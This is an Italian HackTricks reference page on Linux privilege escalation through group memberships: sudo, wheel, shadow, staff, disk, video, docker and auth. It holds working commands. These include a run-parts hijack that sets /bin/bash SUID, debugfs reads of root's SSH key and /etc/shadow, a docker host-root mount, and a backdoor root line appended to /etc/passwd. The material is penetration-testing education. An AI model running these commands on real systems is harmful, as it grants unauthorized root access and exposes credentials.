# Gruppi Sudo/Amministratori

{{#include ../../../banners/hacktricks-training.md}}

## Gruppi Sudo/Amministratori

### **PE - Metodo 1**

**A volte**, **per impostazione predefinita (o perché alcuni software ne hanno bisogno)** all'interno del file **/etc/sudoers** puoi trovare alcune di queste righe:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente appartenente al gruppo sudo o admin può eseguire qualsiasi cosa usando sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
### PE - Method 2

Trova tutti i binari suid e verifica se è presente il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se trovi che il binario **pkexec è un binario SUID** e appartieni al gruppo **sudo** o **admin**, probabilmente potresti eseguire binari come sudo usando `pkexec`.\
Questo perché in genere questi sono i gruppi presenti nella **polkit policy**. Questa policy identifica sostanzialmente quali gruppi possono usare `pkexec`. Verificalo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e, **per impostazione predefinita**, in alcune distribuzioni Linux compaiono i gruppi **sudo** e **admin**.

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se provi a eseguire **pkexec** e ricevi questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Non è perché non disponi delle autorizzazioni, ma perché non sei connesso senza una GUI**. Esiste però una soluzione alternativa per questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sono necessarie **2 sessioni ssh diverse**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Gruppo Wheel

**A volte**, **per impostazione predefinita**, all'interno del file **/etc/sudoers** puoi trovare questa riga:
```
%wheel	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente appartenente al gruppo wheel può eseguire qualsiasi comando tramite sudo**.

In questo caso, per **diventare root è sufficiente eseguire**:
```
sudo su
```
## Gruppo shadow

Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Quindi, leggi il file e prova a **crackare alcuni hash**.

Breve precisazione sullo stato di blocco durante l'analisi degli hash:
- Le voci con `!` o `*` generalmente non consentono l'accesso interattivo tramite password.
- `!hash` di solito indica che è stata impostata una password e poi bloccata.
- `*` di solito indica che non è mai stato impostato alcun hash di password valido.
Questo è utile per la classificazione degli account anche quando l'accesso diretto è bloccato.

## Staff Group

**staff**: Consente agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza richiedere privilegi root (si noti che gli eseguibili in `/usr/local/bin` si trovano nella variabile PATH di qualsiasi utente e possono "sostituire" gli eseguibili con lo stesso nome presenti in `/bin` e `/usr/bin`). Confrontare con il gruppo "adm", più correlato al monitoraggio e alla sicurezza. [\[source\]](https://wiki.debian.org/SystemGroups)

Nelle distribuzioni Debian, la variabile `$PATH` mostra che `/usr/local/` verrà eseguito con la priorità più alta, indipendentemente dal fatto che l'utente disponga o meno di privilegi.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se possiamo dirottare alcuni programmi in `/usr/local`, possiamo ottenere facilmente i privilegi di root.

Dirottare il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché molti programmi eseguono `run-parts` (come crontab e durante l'accesso tramite SSH).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
oppure quando viene effettuato l'accesso a una nuova sessione ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Gruppo disco

Questo privilegio è quasi **equivalente all'accesso root**, poiché consente di accedere a tutti i dati presenti sulla macchina.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Nota che usando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi eseguire:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Tuttavia, se provi a **scrivere file di proprietà di root** (come `/etc/shadow` o `/etc/passwd`), riceverai un errore "**Permission denied**".

## Gruppo video

Usando il comando `w` puoi scoprire **chi ha effettuato l'accesso al sistema** e verrà mostrato un output simile al seguente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Il **tty1** indica che l'utente **yossi ha effettuato l'accesso fisicamente** a un terminale sulla macchina.

Il gruppo **video** ha accesso alla visualizzazione dell'output dello schermo. In pratica, è possibile osservare gli schermi. Per farlo, è necessario **acquisire l'immagine corrente dello schermo** in formato raw e ottenere la risoluzione utilizzata dallo schermo. I dati dello schermo possono essere salvati in `/dev/fb0` e la risoluzione di questo schermo può essere individuata in `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e scegliere **Raw image data** come tipo di file:

![Gruppo Disk - Gruppo Video: per aprire l'immagine raw puoi usare GIMP, selezionare il file screen.raw e scegliere Raw image data come tipo di file](<../../../images/image (463).png>)

Poi modifica Width e Height impostandoli su quelli utilizzati dallo schermo e verifica diversi Image Types (selezionando quello che visualizza meglio lo schermo):

![Gruppo Disk - Gruppo Video: poi modifica Width e Height impostandoli su quelli utilizzati dallo schermo e verifica diversi Image Types (selezionando quello che visualizza meglio lo schermo)](<../../../images/image (317).png>)

## Gruppo root

Sembra che, per impostazione predefinita, i **membri del gruppo root** possano avere accesso per **modificare** alcuni file di configurazione dei **servizi**, alcuni file di **librerie** o **altri elementi interessanti** che potrebbero essere utilizzati per aumentare i privilegi...

**Verifica quali file i membri di root possono modificare**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Puoi **montare il filesystem root della macchina host sul volume di un'istanza**, così, quando l'istanza si avvia, esegue immediatamente un `chroot` su quel volume. Questo ti fornisce di fatto i privilegi root sulla macchina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Infine, se non ti piace nessuno dei suggerimenti precedenti, o se per qualche motivo non funzionano (docker api firewall?), potresti sempre provare a **eseguire un container privilegiato ed evadere da esso**, come spiegato qui:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Se disponi di permessi di scrittura sul docker socket, leggi [**questo post su come effettuare un privilege escalation abusando del docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Gruppo lxc/lxd


{{#ref}}
./
{{#endref}}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** dispongono dei permessi per **leggere i log** situati all'interno di _/var/log/_.\
Pertanto, se hai compromesso un utente appartenente a questo gruppo, dovresti assolutamente **esaminare i log**.

## Gruppi Backup / Operator / lp / Mail

Questi gruppi sono spesso vettori di **credential-discovery** piuttosto che vettori diretti verso root:
- **backup**: può esporre archivi contenenti configurazioni, chiavi, dump di DB o token.
- **operator**: accesso operativo specifico della piattaforma, che può causare il leak di dati sensibili di runtime.
- **lp**: le code e gli spool di stampa possono contenere il contenuto dei documenti.
- **mail**: gli spool di posta possono esporre link di reset, OTP e credenziali interne.

Considera l'appartenenza a questi gruppi come una finding ad alto valore relativa all'esposizione di dati e procedi con il pivot attraverso il riutilizzo di password/token.

## Gruppo auth

In OpenBSD, il gruppo **auth** di solito può scrivere nelle cartelle _**/etc/skey**_ e _**/var/db/yubikey**_, se utilizzate.\
Questi permessi possono essere abusati con il seguente exploit per **effettuare un privilege escalation** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
